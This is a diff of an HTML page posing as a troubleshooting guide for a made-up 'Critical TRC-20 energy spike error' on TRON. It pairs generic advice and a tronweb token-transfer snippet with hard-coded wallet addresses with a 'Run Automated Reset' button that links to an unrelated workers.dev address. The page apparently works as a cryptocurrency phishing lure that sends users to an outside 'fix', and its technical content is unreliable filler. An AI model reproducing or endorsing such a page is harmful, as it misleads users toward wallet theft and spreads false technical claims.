@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: BlinkMacSystemFont;
-        background: #1a1a24;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -41,33 +41,31 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "Critical TRC-20 energy spike error" when attempting to perform transactions on the TRON network, indicating an unusual surge in energy consumption by a smart contract.</li>
+<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an abnormal increase in energy consumption for TRC-20 transactions on the TRON network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to excessive energy usage by a TRC-20 smart contract, likely caused by inefficient coding, recursive loops, or an unexpected increase in user interactions.</li>
+<li>This error occurs when there is a sudden and significant surge in the energy required to process TRC-20 transactions, often due to network congestion, smart contract inefficiencies, or malicious activities.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Adjust the contract's energy settings to prioritize efficiency:</li>
-<li>Reduce the number of redundant operations within the contract.</li>
-<li>Implement a rate limiting mechanism to control the frequency of interactions.</li>
-<li>Optimize contract logic using more efficient algorithms.</li>
+<li>Adjust the transaction energy limit using the <code>--energy</code> flag when sending transactions.</li>
+<li>Optimize smart contract code to reduce energy consumption, such as by minimizing the number of operations or using more efficient data structures.</li>
+<li>Use a transaction batcher to group multiple transactions together, reducing the overall energy required:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;contractSettings&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;energyLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">100000</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;energyPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.sendToken<span class="o">(</span>
+<span class="w">  </span><span class="s2">&quot;TNb8xQ7T5tH5LWjvSWj6JpQ4QYaNJsgjGz&quot;</span><span class="w"> </span>/*<span class="w"> </span>from<span class="w"> </span>*/,
+<span class="w">  </span><span class="s2">&quot;TCaCjRmQp4zB2jKtJFVf4QpQoN7NjGz&quot;</span><span class="w"> </span>/*<span class="w"> </span>to<span class="w"> </span>*/,
+<span class="w">  </span><span class="m">100</span><span class="w"> </span>/*<span class="w"> </span>amount<span class="w"> </span>*/
+<span class="o">)</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more precise control over contract adjustments. </p>
+<p>For further debugging, consider accessing the network using an alternative console. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Basic understanding of TRON's smart contract architecture</li>
-<li>Familiarity with Solidity or equivalent programming language</li>
-<li>Access to the TRON Web3 console or equivalent interface</li>
+<li>A basic understanding of TRON's transaction architecture</li>
+<li>Familiarity with TRON's Web3 API (tronweb)</li>
+<li>Access to the TRON network via a node or gateway</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
